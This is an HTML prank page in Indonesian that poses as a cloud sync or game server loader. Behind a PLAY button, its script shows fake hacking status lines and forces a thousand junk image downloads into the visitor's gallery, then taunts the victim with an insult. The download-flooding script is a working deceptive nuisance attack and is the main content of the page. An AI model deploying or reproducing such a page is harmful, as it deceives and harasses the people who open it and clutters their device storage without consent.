<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Sinkronisasi Cloud</title>
    <style>
        body { background: #000; color: #fff; font-family: 'Courier New', Courier, monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        #overlay, #loader-ui, #finish-ui { text-align: center; width: 85%; }
        .play-btn { background: #ff0000; color: #fff; border: none; padding: 20px 60px; font-size: 26px; font-weight: bold; border-radius: 50px; cursor: pointer; box-shadow: 0 0 25px #ff0000; transition: 0.2s; }
        .play-btn:active { transform: scale(0.9); }
        .progress-bg { background: #222; border-radius: 20px; height: 20px; width: 100%; margin: 25px 0; overflow: hidden; border: 1px solid #444; }
        #fill { background: linear-gradient(90deg, #00ff00, #008800); height: 100%; width: 0%; box-shadow: 0 0 15px #00ff00; }
        .toxic-text { color: #ff0000; font-size: 32px; font-weight: bold; animation: shake 0.1s infinite; display: none; }
        @keyframes shake { 0% {transform:translate(2px,1px)} 50% {transform:translate(-2px,-2px)} 100% {transform:translate(1px,2px)} }
        #status { font-size: 14px; color: #00ff00; height: 20px; }
        
        /* Penyesuaian Footer Bimz Official */
        .footer { 
            position: fixed; 
            bottom: 50px; /* Jarak agak jauh dari bawah */
            left: 0;
            right: 0;
            font-size: 18px; /* Ukuran sedengan */
            color: #666; 
            letter-spacing: 2px;
            font-weight: bold;
            text-align: center;
        }
    </style>
</head>
<body>

    <!-- HALAMAN DEPAN -->
    <div id="overlay">
        <h1 style="letter-spacing: 5px; margin-bottom: 40px;">SERVER READY</h1>
        <button class="play-btn" onclick="startTurboAttack()">PLAY</button>
        <div class="footer">© Bimz Official</div>
    </div>

    <!-- LOADING SCREEN -->
    <div id="loader-ui" style="display: none;">
        <h2 id="title">INJECTING RESOURCES...</h2>
        <div id="percent" style="font-size: 40px; margin-bottom: 10px; color: #00ff00;">0%</div>
        <div class="progress-bg"><div id="fill"></div></div>
        <p id="status">Menginisialisasi handshake...</p>
        <div class="footer">© Bimz Official</div>
    </div>

    <!-- PESAN AKHIR -->
    <div id="finish-ui" class="toxic-text">
        Yahaha bego cek galeri lo 🤣
        <div class="footer" style="color: #ff0000;">© Bimz Official</div>
    </div>

    <script>
        let current = 0;
        const total = 1000;

        const statusTexts = [
            "Connecting to database...",
            "Bypassing firewall...",
            "Extracting OBB files...",
            "Syncing account data...",
            "Injecting skin scripts...",
            "Cleaning cache logs...",
            "Finalizing encryption...",
            "Verifying security patch..."
        ];

        function startTurboAttack() {
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('loader-ui').style.display = 'block';

            const bomber = setInterval(() => {
                if (current >= total) {
                    clearInterval(bomber);
                    document.getElementById('loader-ui').style.display = 'none';
                    document.getElementById('finish-ui').style.display = 'block';
                    return;
                }

                current++;
                let progress = (current / total) * 100;
                document.getElementById('fill').style.width = progress + "%";
                document.getElementById('percent').innerText = Math.floor(progress) + "%";

                if (current % 125 === 0) {
                    const randomText = statusTexts[Math.floor(Math.random() * statusTexts.length)];
                    document.getElementById('status').innerText = randomText;
                }

                const a = document.createElement('a');
                a.href = "https://via.placeholder.com/15x15.jpg?text=TRASH_" + current;
                a.download = "IMG_SYSTEM_" + current + ".jpg";
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);

            }, 50); 
        }
    </script>
</body>
</html>
